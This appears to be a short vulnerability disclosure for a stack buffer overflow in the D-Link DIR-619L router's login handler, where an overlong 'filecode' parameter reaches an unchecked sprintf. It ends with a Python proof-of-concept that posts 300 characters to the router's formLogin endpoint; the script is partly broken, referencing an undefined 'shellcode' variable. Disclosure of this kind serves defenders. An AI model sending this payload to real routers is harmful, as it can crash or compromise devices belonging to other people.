# dir_619l-buffer-overflow

**Vender** ：D-Link

**Firmware version**:2.06beta

**Exploit Author**: ys110

**Vendor Homepage**: http://www.dlink.com.cn/

**Hardware Link**:http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-619L

Vul detail
========

In the handler of router / goform / Login, the http request parameter “filecode” is obtained through the webgetvar function

![image](https://github.com/hhhhu8045759/dir_619l-buffer-overflow/blob/master/1.png)

When the router login webpage is set to log in with the verification code, the filecode parameter is assigned to the a1 register and transmitted to the getauthcode function

![image](https://github.com/hhhhu8045759/dir_619l-buffer-overflow/blob/master/2.png)

The filecode parameter in the getauthcode function is Copy it into the a2 register, the sprintf function copies it to the local stack, however, it does not check the length, and a very long input could lead to stack overflow and overwrite the return address:

![image](https://github.com/hhhhu8045759/dir_619l-buffer-overflow/blob/master/619_2.png)


poc
=======

```c
import requests
import sys
import struct
import string
import base64
def login(shellcode,user,password,ip):
	postData = {
	'login_name':'yuanshuo',
	'curTime':"12345",
	'FILECODE':"a"*300,
	'VER_CODE':'vercode',
	'VERIFICATION_CODE':'12345',
	'login_n':user,
	'login_pass':password,
	}
	response = requests.post('http://192.168.1.1/goform/formLogin',data=postData)
        
        #print 'http://' + ip + '/goform/formLogin'
        print response.json


if __name__ == "__main__":
	login(shellcode,'admin', base64.b64encode('shuoshuo110'),'192.168.1.1')
```
